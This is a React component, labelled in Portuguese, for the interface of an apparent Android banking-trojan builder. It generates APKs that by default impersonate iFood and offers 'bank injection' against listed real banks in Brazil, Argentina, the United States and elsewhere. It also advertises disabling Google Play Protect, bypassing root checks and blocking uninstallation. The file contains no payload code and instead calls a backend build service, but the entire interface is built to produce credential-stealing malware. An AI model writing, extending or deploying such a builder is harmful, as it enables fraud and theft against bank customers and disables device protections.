import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export function APKBuilder() {
  const [appName, setAppName] = useState("iFood");
  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
  const [logoUrl, setLogoUrl] = useState("");
  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState<number>(0);
  
  // Novos campos
  const [bypassRoot, setBypassRoot] = useState(true);
  const [desinstalarPlayProtect, setDesinstalarPlayProtect] = useState(true);
  const [versionName, setVersionName] = useState("1.0.0");
  const [versionCode, setVersionCode] = useState("1");
  const [pais, setPais] = useState("Brasil");
  const [banco, setBanco] = useState("Banco do Brasil");
  const [origemLink, setOrigemLink] = useState("Automatico (Local)");
  
  // Injeção de bancos
  const [injetarTodosBancos, setInjetarTodosBancos] = useState(false);

  // Lista de bancos por país
  const bancosPorPais: Record<string, string[]> = {
    "Brasil": ["Banco do Brasil", "Caixa Econômica Federal", "Itaú Unibanco", "Banco Bradesco", "Banco Santander Brasil", "Nubank", "Banco Inter", "C6 Bank", "PicPay", "Banco Safra"],
    "Argentina": ["Banco de la Nación Argentina", "Banco Provincia", "BBVA Argentina", "Banco Santander Argentina", "Banco Galicia"],
    "Chile": ["Banco de Chile", "Banco Santander Chile", "BBVA Chile", "Banco Security", "Banco Estado"],
    "Colômbia": ["Banco de Bogotá", "Banco de Occidente", "BBVA Colombia", "Banco Santander Colombia", "Banco Davivienda"],
    "Espanha": ["Banco Bilbao Vizcaya Argentaria (BBVA)", "Banco Santander", "CaixaBank", "Banco Sabadell"],
    "Estados Unidos": ["Bank of America", "Wells Fargo", "Chase Bank", "Citibank"],
    "França": ["BNP Paribas", "Société Générale", "Crédit Agricole", "Banque de France"],
    "Portugal": ["Caixa Geral de Depósitos", "Banco BPI", "Banco Santander Portugal", "Banco Montepio"],
    "México": ["BBVA México", "Banco Santander México", "Citibanamex", "Scotiabank Inverlat"],
  };

  const bancosPaisAtual = bancosPorPais[pais] || [];

  const buildMutation = trpc.apk.build.useMutation();

  const handleBuild = async () => {
    if (!appName.trim()) {
      toast.error("Nome do app é obrigatório");
      return;
    }

    if (!appUrl.trim()) {
      toast.error("URL do app é obrigatória");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(10);

    try {
      await buildMutation.mutateAsync({
        appName,
        appUrl,
        logoUrl,
        protectFromUninstall,
        bypassRoot,
        desinstalarPlayProtect,
        versionName,
        versionCode: parseInt(versionCode),
        pais,
        banco: injetarTodosBancos ? '__ALL__' : banco,
        origemLink,
      });

      toast.success("APK gerado com sucesso!");
      setBuildProgress(100);
      
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 1000);
    } catch (error) {
      toast.error("Erro ao gerar APK");
      setIsBuilding(false);
      setBuildProgress(0);
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold flex items-center gap-3 text-cyan-400">
            <Hammer className="w-8 h-8" />
            Gerador de APK
          </h1>
          <p className="text-gray-400 mt-2">Crie APKs customizadas com injeção de bancos</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Coluna de Formulário */}
          <div>
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-cyan-400">Configuração do APK</CardTitle>
                <CardDescription>Preencha os dados para gerar sua APK</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Nome do App */}
                <div>
                  <Label htmlFor="appName" className="text-gray-300 mb-2 block">
                    Nome do App *
                  </Label>
                  <Input
                    id="appName"
                    value={appName}
                    onChange={(e) => setAppName(e.target.value)}
                    disabled={isBuilding}
                    placeholder="Ex: iFood"
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>

                {/* URL do App */}
                <div>
                  <Label htmlFor="appUrl" className="text-gray-300 mb-2 block">
                    URL do App *
                  </Label>
                  <Input
                    id="appUrl"
                    value={appUrl}
                    onChange={(e) => setAppUrl(e.target.value)}
                    disabled={isBuilding}
                    placeholder="https://www.exemplo.com.br"
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>

                {/* URL da Logo */}
                <div>
                  <Label htmlFor="logoUrl" className="text-gray-300 mb-2 block">
                    URL da Logo (Opcional)
                  </Label>
                  <Input
                    id="logoUrl"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    disabled={isBuilding}
                    placeholder="https://..."
                    className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                  />
                </div>

                {/* Version Name e Code */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <Label htmlFor="versionName" className="text-gray-300 mb-2 block">
                      Version Name
                    </Label>
                    <Input
                      id="versionName"
                      value={versionName}
                      onChange={(e) => setVersionName(e.target.value)}
                      disabled={isBuilding}
                      placeholder="1.0.0"
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                  </div>
                  <div>
                    <Label htmlFor="versionCode" className="text-gray-300 mb-2 block">
                      Version Code
                    </Label>
                    <Input
                      id="versionCode"
                      value={versionCode}
                      onChange={(e) => setVersionCode(e.target.value)}
                      disabled={isBuilding}
                      placeholder="1"
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                  </div>
                </div>

                {/* País */}
                <div>
                  <Label htmlFor="pais" className="text-gray-300 mb-2 block">
                    País *
                  </Label>
                  <select
                    id="pais"
                    value={pais}
                    onChange={(e) => setPais(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    {Object.keys(bancosPorPais).map((p) => (
                      <option key={p} value={p}>
                        {p}
                      </option>
                    ))}
                  </select>
                </div>

                {/* Banco para Injeção */}
                <div>
                  <Label htmlFor="banco" className="text-gray-300 mb-2 block">
                    Banco para Injeção *
                  </Label>
                  <select
                    id="banco"
                    value={banco}
                    onChange={(e) => setBanco(e.target.value)}
                    disabled={isBuilding || injetarTodosBancos}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    {bancosPaisAtual.map((b) => (
                      <option key={b} value={b}>
                        {b}
                      </option>
                    ))}
                  </select>
                </div>

                {/* Injetar Todos os Bancos */}
                <div className="flex items-center space-x-2 p-3 bg-slate-700/50 rounded border border-slate-600">
                  <Checkbox
                    id="injetarTodosBancos"
                    checked={injetarTodosBancos}
                    onCheckedChange={(checked) => setInjetarTodosBancos(checked as boolean)}
                    disabled={isBuilding}
                  />
                  <Label htmlFor="injetarTodosBancos" className="text-gray-300 cursor-pointer">
                    ✓ Injetar Todos os Bancos do País
                  </Label>
                </div>

                {/* Origem do Link */}
                <div>
                  <Label htmlFor="origemLink" className="text-gray-300 mb-2 block">
                    Origem do Link APK
                  </Label>
                  <select
                    id="origemLink"
                    value={origemLink}
                    onChange={(e) => setOrigemLink(e.target.value)}
                    disabled={isBuilding}
                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
                  >
                    <option value="Automatico (Local)">Automático (Local)</option>
                    <option value="EAS">EAS</option>
                    <option value="Storage">Storage</option>
                  </select>
                </div>

                {/* Opções Avançadas */}
                <div className="space-y-3 p-4 bg-slate-700/50 rounded border border-slate-600">
                  <p className="text-sm font-semibold text-gray-300">⚙️ Opções Avançadas</p>
                  
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="bypassRoot"
                      checked={bypassRoot}
                      onCheckedChange={(checked) => setBypassRoot(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="bypassRoot" className="text-gray-300 cursor-pointer">
                      ✓ Bypass Root Completo
                    </Label>
                  </div>
                  <p className="text-xs text-gray-400 ml-6">Permite execução em dispositivos com root</p>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="desinstalarPlayProtect"
                      checked={desinstalarPlayProtect}
                      onCheckedChange={(checked) => setDesinstalarPlayProtect(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="desinstalarPlayProtect" className="text-gray-300 cursor-pointer">
                      ✓ Desinstalar Play Protect Automaticamente
                    </Label>
                  </div>
                  <p className="text-xs text-gray-400 ml-6">Remove proteção do Google Play automaticamente</p>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="protectFromUninstall"
                      checked={protectFromUninstall}
                      onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                      disabled={isBuilding}
                    />
                    <Label htmlFor="protectFromUninstall" className="text-gray-300 cursor-pointer">
                      ✓ Proteção contra desinstalação
                    </Label>
                  </div>
                </div>

                {/* Status */}
                {buildMutation.isSuccess && (
                  <div className="p-3 bg-green-900/30 border border-green-600 rounded flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5 text-green-400" />
                    <span className="text-green-300">✓ APK gerado com sucesso!</span>
                  </div>
                )}

                {/* Botão de Gerar */}
                <Button
                  onClick={handleBuild}
                  disabled={isBuilding}
                  className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-3 rounded-lg transition-all"
                >
                  {isBuilding ? (
                    <>
                      <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                      Gerando APK...
                    </>
                  ) : (
                    <>
                      <Download className="w-4 h-4 mr-2" />
                      Build APK
                    </>
                  )}
                </Button>

                {/* Progresso */}
                {isBuilding && (
                  <div className="space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Progresso</span>
                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                    </div>
                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                  </div>
                )}
              </CardContent>
            </Card>
          </div>

          {/* Coluna de Pré-visualização */}
          <div>
            <Card className="bg-slate-800 border-slate-700 sticky top-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Smartphone className="w-5 h-5 text-cyan-400" />
                  Pré-visualização
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Logo */}
                <div className="flex justify-center">
                  {logoUrl ? (
                    <img
                      src={logoUrl}
                      alt={appName}
                      className="w-32 h-32 rounded-lg object-cover border-2 border-cyan-400"
                    />
                  ) : (
                    <div className="w-32 h-32 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-white text-4xl font-bold">
                      {appName.charAt(0)}
                    </div>
                  )}
                </div>

                {/* Nome do App */}
                <div className="text-center">
                  <p className="text-xl font-semibold text-white">{appName}</p>
                  <p className="text-sm text-gray-400 mt-1">Monitor</p>
                </div>

                {/* Banco */}
                <div className="p-3 bg-slate-700/50 rounded text-center border border-slate-600">
                  <p className="text-xs text-gray-400 mb-1">🏦 Banco</p>
                  <p className="text-sm font-semibold text-cyan-400">{injetarTodosBancos ? `Todos os bancos (${pais})` : banco}</p>
                </div>

                {/* URL */}
                <div className="p-3 bg-slate-700/50 rounded border border-slate-600">
                  <p className="text-xs text-gray-400 mb-1">🔗 URL</p>
                  <p className="text-xs text-gray-300 truncate">{appUrl}</p>
                </div>

                {/* País */}
                <div className="p-3 bg-slate-700/50 rounded text-center border border-slate-600">
                  <p className="text-xs text-gray-400 mb-1">🌍 País</p>
                  <p className="text-sm font-semibold text-cyan-400">{pais}</p>
                </div>

                {/* Customizações */}
                <div className="p-4 bg-slate-700/50 rounded space-y-2 text-sm border border-slate-600">
                  <p className="font-semibold text-gray-300 mb-3">Seu APK será customizado com:</p>
                  {logoUrl && <p className="text-gray-400">✓ Logo da empresa</p>}
                  <p className="text-gray-400">✓ Nome customizado</p>
                  <p className="text-gray-400">✓ URL de painel</p>
                  {injetarTodosBancos && <p className="text-cyan-400 font-semibold">✓ Bancos: Todos os bancos ({pais})</p>}
                  {!injetarTodosBancos && <p className="text-gray-400">✓ Banco: {banco}</p>}
                  {bypassRoot && <p className="text-gray-400">✓ Bypass Root Completo</p>}
                  {desinstalarPlayProtect && <p className="text-gray-400">✓ Desinstalação Automática do Play Protect</p>}
                  {protectFromUninstall && <p className="text-gray-400">✓ Proteção contra desinstalação</p>}
                </div>

                {/* Progresso */}
                {isBuilding && (
                  <div className="space-y-2 pt-4 border-t border-slate-600">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Gerando APK...</span>
                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                    </div>
                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
}
